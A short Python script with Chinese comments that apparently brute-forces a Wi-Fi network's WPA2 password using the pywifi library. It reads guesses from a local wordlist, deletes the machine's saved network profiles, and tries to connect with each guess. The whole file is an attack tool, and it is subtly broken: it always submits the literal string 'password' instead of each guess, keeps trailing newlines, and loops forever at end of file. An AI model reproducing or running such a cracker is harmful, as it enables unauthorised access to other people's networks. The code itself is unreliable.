import pywifi
import time
from pywifi import const
#测试链接 返回链接结果
def wificonnect(password):
    #抓取网卡接口
    wifi = pywifi.PyWiFi()
    #获取第一个网卡
    ifaces = wifi.interfaces()[0]
    #断开所有无线连接
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = ifaces.status()

    if wifistatus == const.IFACE_DISCONNECTED:
        print("正在尝试：")
        #创建wifi连接文件
        profile = pywifi.Profile()
        profile.ssid ="wifi名称"
        profile.auth = const.AUTH_ALG_OPEN
        #加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        #加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        #测试密码
        profile.key = "password"
        #删除所有wifi文件
        ifaces.remove_all_network_profiles()
        #设定新的链接文件
        tep_profile = ifaces.add_network_profile(profile)
        #用新的连接 测试链接
        ifaces.connect(tep_profile)
        #连接时间
        time.sleep(60)
        if ifaces.status() == const.IFACE_CONNECTED:
            return  True
        else:
            return False
    else:
        print("已连接")

def readpassword():
    print("开始破解")
    path = "C:\\Users\81920\Desktop\桌面\python项目\破解wifi\pass.txt"
    file = open(path,"r")
    while True:
        try:
            passStr = file.readline()
            bool = wificonnect(passStr)
            if bool:
                print("密码正确",passStr)
                break
            else:
                print("密码错误",passStr)

        except:
            #跳出当前循环直接进行下次循环
            continue
readpassword()
